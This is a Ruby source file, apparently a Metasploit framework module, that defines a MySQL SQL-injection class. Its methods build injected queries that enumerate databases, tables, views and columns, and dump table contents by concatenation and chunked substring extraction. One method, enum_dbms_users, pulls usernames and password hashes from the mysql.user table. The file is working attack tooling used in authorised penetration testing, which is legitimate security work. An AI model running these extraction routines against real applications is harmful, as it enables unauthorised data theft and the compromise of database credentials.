#coding: ascii-8bit

require'msf/core'
#
# This class represents a MySQL Injection object, its primary purpose is to provide the common queries
# needed when performing SQL injection.
# Instanciate it only if you get the query results of your SQL injection returned on the response.
#
class Msf::Exploit::SQLi::MySQLi < Msf::Exploit::SQLi::SQLi
  #
  #   See SQLi#initialize
  #
  def initialize(*args)
    super
  end

  #
  #   Execute the SQL query and return its results
  #   @param query [String] The SQL query to execute
  #   @return [String] The query results
  #
  def run_sql(query)
    super
  end

  #
  #   Query the MySQL version
  #   @return [String] The MySQL version in use
  #
  def version
    if @truncation_length
      truncated_query("select substr(version(),^OFFSET^,#{@truncation_length})")
    else
      run_sql('select version()')
    end
  end

  #
  #   Query the current database name
  #   @return [String] The name of the current database
  #
  def current_database
    if @truncation_length
      truncated_query("select substr(database(),^OFFSET^,#{@truncation_length})")
    else
      run_sql('select database()')
    end
  end

  #
  #   Query the current user
  #   @return [String] The username of the current user
  #
  def current_user
    if @truncation_length
      truncated_query("select substr(user(),^OFFSET^,#{truncation_length})")
    else
      run_sql('select user()')
    end
  end

  #
  #   Query the names of all the existing databases
  #   @return [Array] An array of Strings, the database names
  #
  def enum_database_names
    dump_table_fields('information_schema', 'schemata', %w[schema_name]).flatten
  end

  #
  #   Query the names of the tables in a given database
  #   database can be the name of a database, or a function call, like database() for the current database
  #   @return [Array] An array of Strings, the table names in the given database
  #
  def enum_table_names(database='')
    # enumerate the tables in the given database
    dump_table_fields('information_schema', 'tables', %w[table_name], 
    database.empty? ? '' : "table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  def enum_view_names(database)
    dump_table_fields('information_schema', 'views', %w[table_name], "table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  #
  # Query the mysql users (their username and password), this might require root privileges.
  #
  def enum_dbms_users
    # might require root privileges
    dump_table_fields('mysql', 'user', %w[User Password])
  end

  #
  #   Query the column names of the given table in the given database
  #   database can be the name of a database, or a function call, like database() for the current database
  #   @return [Array] An array of Strings, the column names in the given table belonging to the given database
  #
  def enum_table_columns(database, table_name)
    dump_table_fields('information_schema', 'columns', %w[column_name], "table_name='#{table_name}' and table_schema=#{database.include?('(') ? database : "'" + database + "'"}").flatten
  end

  def find_primary_key(database, table_name)
    dump_table_fields('information_schema', 'key_column_usage',%w(column_name), "table_name='#{table_name}' " +
    "and table_schema=#{database.include?('(') ? database : "'" + database + "'"} and constraint_name='PRIMARY'")
  end
  #
  #  Query the given columns of the records of the given table, that satisfy an optional condition
  #  @param database [String] The database to query
  #  @param table [String]  The name of the table to query
  #  @param columns [Array] The names of the columns to query
  #  @param condition [String] An optional condition, return only the rows satisfying it
  #  @return [Array] An array, where each element is an array of strings representing a row of the results
  #
  def dump_table_fields(database, table, columns, condition = '', limit='')
    # todo: use NOT IN with the primary key to ensure correct results? even then, no guarantees
    return '' if columns.empty?
    one_column = columns.length == 1
    if one_column
      columns = "ifnull(#{columns.first},'#{@null_replacement}')"
    else
      columns = "concat_ws('#{@second_concat_separator}'," + columns.map{|col| "ifnull(#{col},'#{@null_replacement}')"}.join(',') + ')'
    end
    if database == 'database()'
      database = ''
    else
      database += '.'
    end
    unless condition.empty?
      condition = ' where ' + condition
    end
    num_limit = limit.to_i
    if num_limit > 0
      limit = ' limit ' + num_limit.to_s
    end
    retrieved_data = nil
    if @safe
      row_count = run_sql("select count(1) from #{database}#{table}#{condition}").to_i
      retrieved_data = [row_count, num_limit].min.times.map do |current_row|
        if @truncation_length
          truncated_query("select substr(#{columns},^OFFSET^,#{@truncation_length}) from " \
          "#{database}#{table}#{condition} limit #{current_row},1")
        else
          run_sql("select #{columns} from #{database}#{table}#{condition} limit #{current_row},1")
        end
      end
    else
      if @truncation_length
        retrieved_data = truncated_query('select substr(group_concat(' \
        "#{columns}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})," \
        "^OFFSET^,#{@truncation_length}) from #{database}#{table}#{condition}#{limit}")
                         .split(@concat_separator || ',')
      else
        retrieved_data = run_sql("select group_concat(#{columns}#{@concat_separator ? " separator '" + @concat_separator + "'" : ''})" \
        " from #{database}#{table}#{condition}#{limit}").split(@concat_separator || ',')
      end
    end
    retrieved_data.map { |row| row.split(@second_concat_separator) }
  end

  private

  #
  #  Helper method used in cases where the response is truncated.
  #  @param query [String] The SQL query to execute, where ^OFFSET^ will be replaced with an integer offset for querying
  #  @return [String] The query result
  #
  def truncated_query(query)
    result = [ ]
    offset = 1
    loop do
      slice = run_sql(query.sub(/\^OFFSET\^/, offset.to_s))
      offset += @truncation_length
      result << slice
      #puts("Truncated output: slice of #{slice.size} #{slice.length < @truncation_length ? ?< : ?=} #{@truncation_length}")
      puts "[-] Warning : The block returned a string larger than the truncation size : #{slice}" if slice.length > @truncation_length
      # TODO: if verbose, display the length of the string returned
      break if slice.length < @truncation_length
    end
    result.join
  end

  def check_opts(opts)
    super
  end
end

require 'msf/core/exploit/sqli/mysqli/booleanbasedblind'
require 'msf/core/exploit/sqli/mysqli/timebasedblind'
